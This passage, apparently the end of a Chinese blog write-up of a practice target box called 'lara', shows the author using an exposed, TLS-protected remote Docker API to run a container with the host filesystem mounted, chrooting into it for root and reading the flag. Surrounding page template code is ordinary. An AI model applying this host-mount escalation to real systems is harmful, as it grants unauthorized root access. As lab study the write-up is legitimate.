class="hljs-number">1.51</span> (minimum version <span class="hljs-number">1.24</span>)<br>  Go <span class="hljs-params">version:</span>       go1.<span class="hljs-number">24.11</span><br>  Git <span class="hljs-params">commit:</span>       bea959c7b793b32a893820b97c4eadc7c87fabb0<br>  <span class="hljs-params">Built:</span>            Tue Dec  <span class="hljs-number">2</span> <span class="hljs-number">23</span>:<span class="hljs-number">05</span>:<span class="hljs-number">51</span> <span class="hljs-number">2025</span><br>  OS<span class="hljs-operator">/</span><span class="hljs-params">Arch:</span>          linux<span class="hljs-symbol">/amd64</span><br>  <span class="hljs-params">Experimental:</span>     <span class="hljs-literal">false</span><br> <span class="hljs-params">containerd:</span><br>  <span class="hljs-params">Version:</span>          v2.<span class="hljs-number">1.5</span><br>  <span class="hljs-params">GitCommit:</span>        fcd43222d6b07379a4be9786bda52438f0dd16a1<br> <span class="hljs-params">runc:</span><br>  <span class="hljs-params">Version:</span>          <span class="hljs-number">1.3</span>.<span class="hljs-number">4</span><br>  <span class="hljs-params">GitCommit:</span>        d842d7719497cc3b774fd71620278ac9e17710e0<br> <span class="hljs-params">docker-init:</span><br>  <span class="hljs-params">Version:</span>          <span class="hljs-number">0.19</span>.<span class="hljs-number">0</span><br>  <span class="hljs-params">GitCommit:</span>        <br></code></pre></td></tr></table></figure>
+
+<p>探测docker容器</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">┌──<span class="hljs-params">(root㉿kali)</span>-[<span class="hljs-string">/home/kali/Desktop/certs</span>]<br>└─<span class="hljs-comment"># # 在当前终端设置别名 (临时生效)</span><br><span class="hljs-keyword">alias</span> dhost=&#x27;docker <span class="hljs-params">--tls</span> <span class="hljs-params">--tlscert=client-cert</span>.pem <span class="hljs-params">--tlskey=client-key</span>.pem -H tcp:<span class="hljs-string">//192.168.56.207</span><span class="hljs-function">:8888</span>&#x27;                                                                                                                                                        <br>┌──<span class="hljs-params">(root㉿kali)</span>-[<span class="hljs-string">/home/kali/Desktop/certs</span>]<br>└─<span class="hljs-comment"># dhost images</span><br>REPOSITORY     TAG       IMAGE ID       CREATED      SIZE<br>laravel-vuln   latest    aaf7bbe495b7   9 days ago   141MB<br></code></pre></td></tr></table></figure>
+
+<p>成功root</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs nix">┌──(root㉿kali)-[<span class="hljs-operator">/</span>home<span class="hljs-operator">/</span>kali<span class="hljs-operator">/</span>Desktop<span class="hljs-operator">/</span>certs]<br>└─<span class="hljs-comment"># # 使用本地的 laravel-vuln 镜像，并尝试启动 /bin/bash (如果没有bash则尝试 /bin/sh)</span><br>dhost run <span class="hljs-operator">-</span>it <span class="hljs-operator">-</span>-rm <span class="hljs-operator">-</span>v <span class="hljs-operator">/</span>:<span class="hljs-symbol">/mnt</span> laravel-vuln <span class="hljs-symbol">/bin/sh</span>  <br><span class="hljs-symbol">/src/laravel</span> <span class="hljs-comment"># chroot /mnt /bin/bash</span><br><span class="hljs-params">chroot:</span> can&#x27;t execute &#x27;<span class="hljs-operator">/</span>bin<span class="hljs-operator">/</span><span class="hljs-params">bash&#x27;:</span> No such file <span class="hljs-keyword">or</span> directory<br><span class="hljs-symbol">/src/laravel</span> <span class="hljs-comment"># chroot /mnt /bin/sh</span><br><span class="hljs-symbol">/</span> <span class="hljs-comment"># id</span><br>u<span class="hljs-attr">id</span><span class="hljs-operator">=</span><span class="hljs-number">0</span>(root) gid<span class="hljs-operator">=</span><span class="hljs-number">0</span>(root) groups<span class="hljs-operator">=</span><span class="hljs-number">0</span>(root),<span class="hljs-number">0</span>(root),<span class="hljs-number">1</span>(bin),<span class="hljs-number">2</span>(daemon),<span class="hljs-number">3</span>(sys),<span class="hljs-number">4</span>(adm),<span class="hljs-number">6</span>(disk),<span class="hljs-number">10</span>(wheel),<span class="hljs-number">11</span>(floppy),<span class="hljs-number">20</span>(dialout),<span class="hljs-number">26</span>(tape),<span class="hljs-number">27</span>(video)<br><span class="hljs-symbol">/</span> <span class="hljs-comment"># cd /root</span><br>~ <span class="hljs-comment"># ls</span><br>root.txt<br>~ <span class="hljs-comment"># cat root.txt</span><br>flag&#123;root-ede49d353365dfcf95b6bf8df1b7a2dc&#125;<br>~ <span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>
+
+<p>真的是一路要提示过来的（除了user部分），太菜了我，以后要看一看docker和openssl加密这一块。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%A4%8D%E7%9B%98/" class="print-no-link">#复盘</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>靶机复盘-lara</div>
+      <div>http://example.com/2026/01/06/靶机复盘-lara/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Skyarrow</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>January 6, 2026</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/01/04/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%87%BA%E9%A2%98%E6%84%9F%E6%82%9F%E5%85%BC2025%E5%B9%B4%E6%80%BB%E7%BB%93/" title="第一次出题感悟兼2025年总结">
+                        <span class="hidden-mobile">第一次出题感悟兼2025年总结</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
